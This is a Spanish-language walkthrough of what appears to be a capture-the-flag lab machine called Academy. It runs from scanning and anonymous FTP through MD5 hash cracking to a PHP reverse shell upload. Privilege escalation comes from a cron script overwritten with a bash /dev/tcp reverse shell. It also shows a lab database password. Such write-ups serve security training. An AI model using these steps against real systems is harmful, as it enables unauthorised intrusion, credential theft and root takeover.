## Summary

Tags: #FTP #SSH #HTTP #Hash #HashCat #ReverShell #LinPEAS #www-data #PSPY 

- IP -> 192.168.68.110
- Ports -> TCP (21,22,80,), UDP (idk)
- OS ->  Linux
- Services & Applications
    - FTP -> anonymous allowed
    - HTTP -> Apache2 httpd 2.4.38

## Recon

```bash
❯ arp-scan -I ens33 --localnet --ignoredups              # Para hacer un escaneo de la red 

	# I = i mayuscula; es la interface ens33
	# ignoredups = Ignora IPs duplicadas 
```

```bash 
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn ❮Target IP❯  -oG allPorts
```

```bash
❯ nmap -sCV -p22,... ❮Target IP❯ -oN targeted
```

Para conectarnos al servidor
```bash
❯ ftp ❮IP❯                              # Si el servidor nos lo permite nos podemos conectar como Anonymous sin colocar password.

	❯ dir / ls                              # Listar el contenido del directorio
	❯ get ❮File❯                            # Podemos copiarnos un archivo.
```
Encontramos un archivo llamado **note.txt** en donde podemos observar un **UserID:Hash**

```bash 
❯ hash-identifier                           # Abriremos la tool y desoues colocaremos el hash a encontrar
```
Nos muestra que el Hash es: MD5

Usaremos Hashcat para hacer fuerza bruta al Hash
```bash
❯ hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt 

	# m = 0 = MD5
	# hashes.txt = Archivo que contiene el hash
```
Como resultado nos da que la passwd: student

Dirbuster de manera no grafica
```bash
❯ dirb http://<IP>
```

O podemos usar Ffuf
```bash
❯ ffuf -u http://❮IP❯/FUZZ -w /usr/share/seclists/dirbuster/directory-list-2.3-medium.txt:FUZZ

	# u -> url 
	# w -> ruta del diccionario 
	# FUZZ -> Ahi se van a sustituir las palabras del diccionario
```

Entramos a la web con el Dir que encontramos de **Academy** ahi introducimos el User:Passwd


## User
Observarmos que podemos subir una 'imagen', pero en lugar de eso vamos a subir un archivo que contenga una ReverShell en PHP.
* [ReverShell-PHP](https://github.com/pentestmonkey/php-reverse-shell)
Ahi encontraremos una ReverShell en donde copiaremos el RAW y lo pegaremos en un archivo 'shell.php' en nuestra maquina de atacante. En ese archivo le cambiaremos a nuestra IP y nuestro Puerto. 
* El archivo creado, lo subiremos a la web 

```bash
❯ nc -nlvp 443                          # Nos ponemos en escucha parta recibir la ReverShell  
```
Ahora hemos obtenido acceso a la maquina como el usuario **www-data**

Ahora tendremos que hacer escalada de privilegios
```bash
❯ sudo -l                               # Para ver si tenemos privilegios en el Sudoers (l=ele), que podamos ejecutar comandos como (root) NOPASSWD
```

Usaremos LinPEAS para ver las vulnerabilidades y asi poder escalar privilegios.
- [LinPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)    ->   Te muestra todas las vulnerabilidades que existen en esa distribucion 

Una vez descargado, lo que debemos de hacer es subirlo a la maquina victima.
```bash
❯ python3 -m http.server 80                 # Nos montamos un servidor http 80 en donde se encuentra el LinPeas
```

Para poder subirlo, siempre debemos de irnos al directorio de **/tmp** en la maquina victima ya que ahi hay permisos de lectura y escritura.
```bash
❯ cd /tmp  
```

Comando que ejecutaremos en la maquina victima para descargarnos el linpeas desde la maquina de atacante
```bash
❯ wget http://❮IP❯/linpeas.sh                   # Para poder cargar o descargar un archivo especifico desde una IP de atacante
```

```bash
❯ chmod u+x linpeas.sh                          # Le cambiamos los permisos a un archivo (r=read, w=write, x=execution, u=user, g=grupo, o=other)
```

```bash
❯ ./linpeas.sh                                  # Para ejecutar el binario, podremos ver los diferentes colores y ahi podremos ver en donde es mas facil poder hacer el (PE=Privilege Escalation)
```

* Encontramos un archivo en la siguiente ruta **/home/grimmie/backup.sh** 
* Ademas de una passwd para mysql **My_V3ryS3cur3_P4ss** en la ruta **/var/www/html/academy/includes/config.php**

```bash
❯ cat /etc/passwd             # Podemos ver los usuarios, no las passwd. Los usuarios tiene /bin/bash al final 
```
Observamos que Grimmie es Administrador.

Como el puerto 22 estaba abieto, podemos entrar usando la passwd que encontramos y el usuario Administrador
```bash
❯  ssh grimmie@192.168.68.110                                  # Para conectarnos por ssh en el puerto default 22
```
Ahora somos Grimmie

Miramos que en el home del usaurio Grimmie hay un archivo que se ejecuta cada cierto tiempo. Por lo que 
```bash
❯ crontab -l                         # Ver las tareas CRON (l=ele) del sistema
❯ crontab -u root -l                 # Pero nos pide privilegios de root
```

```bash
❯ systemctl list-timers              # Para ver cada cuanto tiempo se ejecuta una tarea
```


-   **Herramienta PSPY**: [https://github.com/DominicBreuker/pspy](https://github.com/DominicBreuker/pspy)
Esta herramienta nos ayudara a identificar tareas, procesos que se estan ejecutando.
	Releases > Improved troubleshooting > **pspy64** -> Binario que debemos de descargar
Nos descargamos esta herramienta 
```bash
❯ ./pspy                            # Ejecutamos el binario 
```

Una vez descargado, lo que debemos de hacer es subirlo a la maquina victima.
```bash
❯ python3 -m http.server 80                 # Nos montamos un servidor http 80 en donde se encuentra el LinPeas
```

Comando que ejecutaremos en la maquina victima para descargarnos el pspy64 desde la maquina de atacante
```bash
❯ wget http://❮IP❯/pspy64                   # Para poder cargar o descargar un archivo especifico desde una IP de atacante
```


## Root

Para escalar privilegios, podemos modificar el archivo del backup.sh que se esta ejecuando cada cierto tiempo,  borrarle el conetnido y colocarle la ReverShell

```bash
❯ nano backup.sh
	bash -i >& /dev/tcp/10.10.14.13/443 0>&1         # Colocamos nuestra IP y nuestro Puerto de atacante
```

```bash
❯ nc -nlvp 443        # Nos ponemos en escucha
```

Despues de un tiempo, cuando se ejecute de nuevo la tarea ahora nos hara root.

